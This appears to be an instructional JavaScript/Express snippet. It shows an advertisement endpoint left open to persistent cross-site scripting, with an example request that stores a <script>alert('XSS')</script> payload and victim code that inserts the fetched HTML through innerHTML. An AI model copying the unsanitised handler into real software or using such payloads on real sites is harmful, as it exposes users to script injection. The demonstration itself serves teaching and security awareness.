/* -----------------------------------------------------------------------------
Persistent XSS Vulnerability:
- The /advertisements endpoint returns user-generated content without proper sanitization or encoding.
- An attacker can exploit this by submitting a malicious advertisement containing a script.
- Example: Submitting an advertisement with the title "<script>alert('XSS')</script>" will execute the alert when the ad is viewed.
-----------------------------------------------------------------------------*/
app.post("/create-advertisement", (req, res) => {
  const { title, description } = req.body;
  if (!title || !description)
    return res.status(400).json({ message: "Missing title or description" });

  // ISSUE: Persistent XSS Vulnerability - unsanitized user input
  adsDb.push({ title, description });
  return res
    .status(201)
    .json({ message: "Advertisement created successfully" });
});

/* -----------------------------------------------------------------------------
Persistent XSS Impact Exploit Example:
- An attacker can exploit the persistent XSS vulnerability in the /advertisements endpoint
- by submitting a malicious advertisement containing a script.
- Example: By creating an advertisement with the title "<script>alert('XSS')</script>",
- the attacker can execute arbitrary JavaScript in the browsers of users who view the advertisement.
-----------------------------------------------------------------------------*/

// Attacker submits a malicious advertisement
fetch("/create-advertisement", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    title: "<script>alert('XSS')</script>",
    description: "This is a malicious advertisement.",
  }),
});

// Victim views the advertisements, triggering the XSS
// In this case, the victim's browser will execute the alert when the ads are rendered
fetch("/advertisements", {
  method: "GET",
  headers: { "Content-Type": "text/html" },
})
  .then((res) => res.text())
  .then((html) => {
    document.body.innerHTML += html;
  });
